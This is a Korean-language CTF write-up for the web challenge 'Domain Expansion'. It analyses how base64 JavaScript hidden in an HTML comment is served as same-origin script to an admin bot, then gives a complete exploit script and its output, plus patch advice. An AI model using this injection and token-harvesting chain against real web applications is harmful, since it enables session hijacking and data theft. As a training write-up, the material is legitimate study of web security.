---
tags:
  - type/machine
  - platform/ctf
  - status/unsolved
type: machine
platform: ctf
status: unsolved
tech_count: 0
---
![[Pasted image 20260426070347.png]]

![[Pasted image 20260426070407.png]]


# Domain Expansion — Writeup

**Category**: Web **Event**: CTF@AC26 **Author**: thek0der

---

## 0. TL;DR

저장된 캠페인 본문의 HTML 주석에 base64 인코딩된 JavaScript를 삽입하면, 서버가 이를 `/review-assets/:id.js`에서 `application/javascript`로 그대로 응답한다. 캠페인 안에 `<domain-expansion data-blueprint=...>`를 함께 심어두면 admin bot이 review 페이지를 방문할 때 reviewer → pulse → relay 번들 체인이 자동으로 동작하며 이 스크립트를 admin iframe 컨텍스트에서 로드한다. 결과적으로 manifest 인증 체인의 모든 토큰이 클라이언트 측에 노출되며, `script-src 'self'` CSP는 정상적으로 통과한다. 획득한 flag는 별도의 캠페인을 생성해 same-origin으로 회수한다.

---

## 1. Recon

### 1.1 구성

```
src/app/
├── server.js           # Express 라우터, 토큰 서명, HTML 렌더링
├── bot.js              # playwright-core 기반 admin bot
├── store.js            # in-memory campaign/session 저장소
└── static/
    ├── app.js                          # 공개 /expansion 페이지 렌더러
    ├── reviewer.js                     # /review 페이지 (admin)
    ├── legacy-frame.js                 # iframe 내부 부트스트랩
    ├── components/domain-expansion.js  # custom element 정의
    └── reviewer-bundles/
        ├── pulse.js                    # 1차 단계 번들
        └── relay.js                    # 2차 단계 번들
```

### 1.2 의존성

```json
"dompurify": "3.1.6",
"express": "4.21.2",
"playwright-core": "1.54.2"
```

DOMPurify 3.1.6 자체에 알려진 mXSS 우회가 존재하지만, 이번 챌린지에서는 sanitizer를 우회하지 않는다. 출제자가 의도한 함정 중 하나로 보인다.

### 1.3 페이지와 권한

|Path|인증|CSP|비고|
|---|---|---|---|
|`/expansion/:id`|guest|없음|공개 프리뷰|
|`/review/:id`|admin|`default-src 'none'; script-src 'self'; ...`|bot 방문|
|`/review-assets/:id.js`|admin + grant|—|저장된 body 주석에서 JS 추출하여 응답|
|`/api/admin/flag`|admin + 6개 헤더|—|flag 반환|

bot은 매 요청마다 새 admin 세션을 발급받고 `sid` 쿠키만 들고 `/review/:id`를 방문, 5초간 머무른다 (`bot.js`).

```js
const session = issueSession("admin");
await context.addCookies([{ name: "sid", value: session.sid, ... }]);
await page.goto(targetUrl, { waitUntil: "networkidle" });
await page.waitForTimeout(5000);
```

---

## 2. Flag Endpoint 분석

`/api/admin/flag` 핸들러 조건:

```js
req.session.role === "admin"
req.session.reviewScope === assetId
reviewKey  === req.session.reviewKey
frameKey   === req.session.frameKey
flagGrant  === signGrant(req.session, assetId, "flag")
traceToken === signTraceToken(req.session, assetId)
flagProof  === signFlagProof(flagGrant, traceToken, signWard(req.session, assetId))
```

서명 함수는 모두 서버 측 비밀(`relaySalt`, `wardSalt`)을 sha256 입력으로 사용한다.

```js
function signGrant(session, assetId, purpose) {
  return sha256(`${session.reviewKey}:${session.relaySalt}:${assetId}:${purpose}`);
}
function signTraceToken(session, assetId) {
  return sha256(`${session.reviewKey}:${session.frameKey}:${session.relaySalt}:${assetId}:trace`);
}
function signWard(session, assetId) {
  return sha256(`${session.frameKey}:${signWardSeed(session)}:${assetId}`);
}
```

오프라인 위조는 불가능하다. admin 세션 내부에서 정상 발급 흐름을 트리거해 토큰을 확보해야 한다.

`reviewScope`는 admin이 `/review/:id`를 GET할 때만 설정된다.

```js
if (req.session.role === "admin") {
  req.session.reviewScope = campaign.id;
  req.session.reviewLoadedAt = new Date().toISOString();
}
```

bot이 매번 새 세션을 발급받기 때문에, 공격은 **bot이 우리가 제어하는 캠페인의 review 페이지에 머무는 5초 안에 모든 단계를 끝내야 한다**.

---

## 3. Review 파이프라인 분석

### 3.1 reviewer.js (top frame)

`<domain-expansion>` 요소를 srcdoc iframe으로 hydrate한다.

```js
frame.srcdoc = buildFrameDocument({
  assetId: reviewAssetId,
  frameKey: runtime.frameKey,
  shell: decodeBlueprintShell(node.getAttribute("data-blueprint")),
  ...
});
wireReviewBridge(frame, runtime);
```

iframe document에는 다음이 박힌다.

```html
<body data-review-asset-id="${assetId}">
  <meta name="frame-key" content="${frameKey}">
  <script id="legacy-blueprint" type="application/json">${payload}</script>
  <script src="/vendor/purify.min.js"></script>
  <script src="/static/legacy-frame.js"></script>
</body>
```

부모 document에는 `<meta name="review-key">`가 박혀 있다. srcdoc은 same-origin이므로 iframe에서 `top.document`로 부모 메타 접근이 가능하다.

reviewer.js는 iframe과 `MessageChannel`을 맺고 부모 측 port를 보유한다.

```js
const channel = new MessageChannel();
const port = channel.port1;
port.onmessage = (event) => handleBridgeMessage(event, runtime, port);
frame.addEventListener("load", () => {
  frame.contentWindow.postMessage(
    { type: "domain-expansion:bridge" }, "*", [channel.port2]
  );
}, { once: true });
```

`handleBridgeMessage`는 `domain-expansion:attune` 메시지를 받으면 `ward`를 sha256으로 계산해 응답한다. 클라이언트는 `wardSeed`(서버 시크릿 의존)를 알 필요 없이 reviewer가 대리 계산해주는 구조다.

reviewer는 시작 시점에 `/api/review/bind`를 호출해 `bindNonce`를 세션에 등록한다. 이게 없으면 cascade/manifest는 모두 403이다.

### 3.2 legacy-frame.js (iframe)

`payload.shell`을 DOMPurify로 sanitize한 후 `{{label}}`, `{{domain}}`을 치환해 root에 삽입하고, `[data-bundle]` 속성을 가진 노드의 매핑된 스크립트를 로드한다.

```js
function resolveBundle(bundle) {
  if (bundle === "legacy:pulse") {
    return "/static/reviewer-bundles/pulse.js";
  }
  return null;
}
```

shell은 attacker controlled이고 `data-bundle`/`data-seal`이 모두 ADD_ATTR에 포함되어 있어 sanitize를 통과한다.

### 3.3 pulse.js → relay.js

pulse.js는 `data-seal`을 디코드한다.

```js
const seal = decodeSeal(card.getAttribute("data-seal"));
if (!seal || seal.kind !== "relay" || !assetId) return;
```

`assetId`는 `seal.assetId`로 직접 지정 가능하지만, `seal.slot`을 `"review"`/`"self"`/`"current"` 중 하나로 두면 `document.body.dataset.reviewAssetId`에서 자동 추출된다. 이 값은 reviewer.js가 srcdoc에 박아둔 현재 캠페인 ID이므로, 캠페인이 자기 자신을 가리키게 만드는 것이 가장 깔끔하다.

조건이 맞으면 relay.js가 동적으로 로드되고 다음을 수행한다.

1. `top.document`의 `review-key`, 자기 `document`의 `frame-key` 추출
2. 부모 port로 `domain-expansion:attune` 전송 → `ward` 수신
3. `/api/review/manifest/:id`를 호출해 `{ scriptUrl, traceToken }` 획득
4. `globalThis.__relayState = { assetId, ward, traceToken }` 저장
5. `<script src="${manifest.scriptUrl}">` 동적 추가

`scriptUrl`은 항상 `/review-assets/:id.js?grant=...` 꼴이다.

---

## 4. 1차 취약점: Review Asset 주입

`server.js`:

```js
function extractReviewModule(markup) {
  const match = String(markup || "")
    .match(/<!--\s*DE-MODULE:([A-Za-z0-9_-]{1,8192})\s*-->/i);
  if (!match) return "";

  const normalized = match[1].replaceAll("-", "+").replaceAll("_", "/");
  const padded = normalized.padEnd(Math.ceil(normalized.length / 4) * 4, "=");
  const decoded = Buffer.from(padded, "base64").toString("utf-8");
  if (decoded.length > 6144) return "";

  return decoded;
}
```

이 정규식은 store에 저장된 raw markup 문자열에 직접 적용된다. DOMPurify가 어떻게 댓글을 처리하든 무관하다. `<!-- DE-MODULE:<url-safe base64> -->` 한 줄을 캠페인 본문에 추가하면 base64 디코드된 임의 JavaScript가 `application/javascript`로 응답된다.

`/review-assets/:id.js` 핸들러는 admin role과 reviewScope, `signGrant(asset)` 일치를 요구하지만, 이 grant는 manifest 응답에 포함되어 자동으로 전달되므로 정상 체인을 그대로 따라가면 만족된다.

CSP `script-src 'self'`는 same-origin URL이라 그대로 통과한다. 즉 sanitizer 우회가 아니라, **공격자 제어 코드를 동일 출처 정적 리소스처럼 응답하게 만드는** 설계 결함이다.

---

## 5. 익스플로잇 구성

### 5.1 캠페인 본문 레이아웃

```
<domain-expansion
  label="pwn"
  domain="pwn.test"
  data-blueprint="<base64 JSON>">
</domain-expansion>
<!-- DE-MODULE:<base64 JS> -->
```

`data-blueprint`:

```json
{
  "shell": "<section class=\"legacy-card\" data-bundle=\"legacy:pulse\" data-seal=\"<base64 JSON>\">...</section>"
}
```

`data-seal`:

```json
{ "kind": "relay", "slot": "review" }
```

이 두 값이 pulse.js → relay.js → DE-MODULE 스크립트 체인을 자동으로 트리거한다.

### 5.2 DE-MODULE JavaScript

`relay.js`가 이 스크립트를 로드하는 시점에는 `__relayState = {assetId, ward, traceToken}`이 이미 채워져 있고, admin sid 쿠키는 same-origin fetch에 자동 첨부된다. 남은 작업은 `flagGrant` 발급, `flagProof` 계산, flag 회수다.

```js
(async () => {
  const reviewKey = top.document.querySelector('meta[name="review-key"]').content;
  const frameKey  = document.querySelector('meta[name="frame-key"]').content;
  const { assetId, ward, traceToken } = globalThis.__relayState;

  // flagGrant 발급
  const { flagGrant } = await fetch('/api/review/cascade/' + assetId, {
    credentials: 'same-origin',
    headers: {
      'X-Review-Key': reviewKey,
      'X-Frame-Key':  frameKey,
      'X-Ward':       ward,
    },
  }).then(r => r.json());

  // flagProof = sha256(flagGrant : traceToken : ward)
  const enc = new TextEncoder().encode(`${flagGrant}:${traceToken}:${ward}`);
  const digest = await crypto.subtle.digest('SHA-256', enc);
  const flagProof = [...new Uint8Array(digest)]
    .map(b => b.toString(16).padStart(2, '0')).join('');

  // flag 회득
  const { flag } = await fetch('/api/admin/flag', {
    credentials: 'same-origin',
    headers: {
      'X-Review-Key':  reviewKey,
      'X-Frame-Key':   frameKey,
      'X-Asset-Id':    assetId,
      'X-Flag-Grant':  flagGrant,
      'X-Trace-Token': traceToken,
      'X-Flag-Proof':  flagProof,
    },
  }).then(r => r.json());

  // 회수: 새 캠페인 본문에 flag를 저장
  await fetch('/api/campaigns', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ title: 'pwn', strapline: 'pwn', body: 'FLAG=' + flag }),
  });
})();
```

CSP는 `connect-src 'self'`이므로 외부로 보내지는 못한다. 그러나 `POST /api/campaigns`는 인증을 요구하지 않으며, 생성된 캠페인은 누구나 `GET /api/campaigns/:id`로 조회 가능하다. 이를 사이드 채널로 활용했다.

### 5.3 전체 익스플로잇 스크립트

```js
#!/usr/bin/env node
// Usage: node exploit.js http://TARGET

const TARGET = process.argv[2] || 'http://127.0.0.1:8080';

const PAYLOAD_JS = `(async () => {
  try {
    const reviewKey = top.document.querySelector('meta[name="review-key"]').content;
    const frameKey  = document.querySelector('meta[name="frame-key"]').content;
    const { assetId, ward, traceToken } = globalThis.__relayState;

    const { flagGrant } = await fetch('/api/review/cascade/' + assetId, {
      credentials: 'same-origin',
      headers: { 'X-Review-Key': reviewKey, 'X-Frame-Key': frameKey, 'X-Ward': ward },
    }).then(r => r.json());

    const enc = new TextEncoder().encode(flagGrant + ':' + traceToken + ':' + ward);
    const digest = await crypto.subtle.digest('SHA-256', enc);
    const flagProof = [...new Uint8Array(digest)]
      .map(b => b.toString(16).padStart(2, '0')).join('');

    const { flag } = await fetch('/api/admin/flag', {
      credentials: 'same-origin',
      headers: {
        'X-Review-Key':  reviewKey,
        'X-Frame-Key':   frameKey,
        'X-Asset-Id':    assetId,
        'X-Flag-Grant':  flagGrant,
        'X-Trace-Token': traceToken,
        'X-Flag-Proof':  flagProof,
      },
    }).then(r => r.json());

    await fetch('/api/campaigns', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ title: 'pwn', strapline: 'pwn', body: 'FLAG=' + flag }),
    });
  } catch (e) {
    try {
      await fetch('/api/campaigns', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: 'err', strapline: 'err',
                              body: 'ERR=' + (e?.message || String(e)) }),
      });
    } catch {}
  }
})();`;

const b64url = (s) => Buffer.from(s).toString('base64')
  .replaceAll('+', '-').replaceAll('/', '_').replace(/=+$/, '');

const seal = b64url(JSON.stringify({ kind: 'relay', slot: 'review' }));
const shell = `<section class="legacy-card" data-bundle="legacy:pulse" data-seal="${seal}">`
            + `<div class="legacy-topline">x</div>`
            + `<h3>{{label}}</h3><p class="legacy-domain">{{domain}}</p></section>`;
const blueprint = b64url(JSON.stringify({ shell }));
const moduleB64 = b64url(PAYLOAD_JS);

const body =
  `<domain-expansion label="pwn" domain="pwn.test" data-blueprint="${blueprint}"></domain-expansion>\n` +
  `<!-- DE-MODULE:${moduleB64} -->`;

const postJSON = (path, payload) => fetch(TARGET + path, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(payload),
}).then(r => r.json());

const getJSON = (path) => fetch(TARGET + path).then(r => r.json());

(async () => {
  const created = await postJSON('/api/campaigns', { title: 'pwn', strapline: 'pwn', body });
  const id = created.id;
  console.log('[+] planted campaign:', id);

  const before = await getJSON('/api/campaigns');
  const seen = new Set(before.items.map(i => i.id));

  await postJSON('/api/report', { id });
  console.log('[+] reported, waiting for the bot...');

  for (let i = 0; i < 20; i++) {
    await new Promise(r => setTimeout(r, 1500));
    const after = await getJSON('/api/campaigns');
    const fresh = after.items.find(i =>
      !seen.has(i.id) && i.id !== id && (i.title === 'pwn' || i.title === 'err'));
    if (fresh) {
      const full = await getJSON('/api/campaigns/' + fresh.id);
      console.log('[+] exfil campaign:', fresh.id);
      console.log(full.body);
      return;
    }
  }
  console.log('[-] timed out');
})();
```

---

## 6. 실행 결과

```
$ node exploit.js http://127.0.0.1:8080
[+] planted campaign: f90f3f8181a2
[+] reported, waiting for the bot...
[+] exfil campaign: 9b283556a555
FLAG=CTFAC{expanding_the_surface_changes_the_shape}
```

---

## 7. 공격 단계 요약

```
[attacker]                            [server]                       [admin bot iframe]
    |                                     |                                  |
    |-- POST /api/campaigns ------------->|                                  |
    |   body = <domain-expansion          |                                  |
    |          data-blueprint=...>        |                                  |
    |          + <!--DE-MODULE:...-->     |                                  |
    |                                     |                                  |
    |-- POST /api/report ---------------->|                                  |
    |                                     |-- bot이 /review/:id 방문 ------->|
    |                                     |   (admin 쿠키, CSP 'self' only)  |
    |                                     |                                  |
    |                                     |   reviewer.js → srcdoc iframe ──┤
    |                                     |   ↓                              |
    |                                     |   legacy-frame.js                │
    |                                     |   data-bundle="legacy:pulse"     │
    |                                     |   → pulse.js                     │
    |                                     |   data-seal {kind:relay,         │
    |                                     |              slot:review}        │
    |                                     |   → relay.js                     │
    |                                     |   → /api/review/manifest/:id     │
    |                                     |     {scriptUrl,traceToken}       │
    |                                     |   → /review-assets/:id.js        │
    |                                     |     [공격자 JS 실행]             │
    |                                     |   → /api/review/cascade/:id      │
    |                                     |   → /api/admin/flag              │
    |                                     |   → POST /api/campaigns          │
    |                                     |     {body: 'FLAG=...'}           │
    |                                     |                                  |
    |-- GET /api/campaigns/<new id> ----->|                                  |
    |<-- {body: 'FLAG=...'} --------------|                                  |
```

---

## 8. 분석 메모

### 8.1 출제자 의도 포인트

- **DOMPurify는 미끼**: 3.1.6의 mXSS 우회를 떠올리게 만들지만 sanitize layer는 우회되지 않는다. 진짜 결함은 서버가 sanitize 결과가 아니라 raw 저장 본문에서 정규식으로 코드 블록을 추출한다는 점이다.
- **HTML 주석은 sanitize 무관**: `extractReviewModule`이 store의 원본 문자열에 직접 적용되므로 클라이언트 sanitize 결과와 독립적이다.
- **두 단계 번들 분리**: pulse → relay 분리는 `slot: "review"`로 자기 자신을 가리키는 깔끔한 트리거를 가능케 한다. seal에 직접 `assetId`를 박아도 동작하지만, 자기 캠페인 ID를 미리 알 필요가 있어 번거롭다.
- **토큰 체인의 의미**: `ward`, `traceToken`, `flagGrant`, `flagProof`를 서버 시크릿으로 분리해두면 오프라인 위조가 차단되어, 반드시 admin 컨텍스트에서 코드를 실행해야만 한다는 제약이 만들어진다.

### 8.2 회수 채널 선택

CSP `connect-src 'self'`로 인해 외부 송신은 불가능하다. 가능한 회수 경로:

1. 새 캠페인 생성 (사용한 방법). 인증 불필요, body에 임의 문자열 삽입 가능, 외부에서 GET으로 조회.
2. URL fragment를 이용한 self-redirect — 별도 origin이 없어 효용 없음.
3. 시간 기반 사이드 채널 — 가능하지만 5초 시간 제약상 비효율.

1번이 가장 단순하고 안정적이다.

### 8.3 단일 패치 권고 (방어자 관점)

- `extractReviewModule`을 제거하거나, 서명된 manifest에 의해서만 도달 가능한 정적 자산으로 대체한다.
- review 페이지 CSP에 `script-src` nonce를 추가하고 `'self'`를 제거한다.
- iframe이 부모 document의 메타 정보에 접근하지 못하도록 srcdoc 대신 sandboxed iframe + `postMessage` 한정 통신으로 전환한다.
- 캠페인 생성에 인증을 부여하여 사이드 채널을 제거한다.

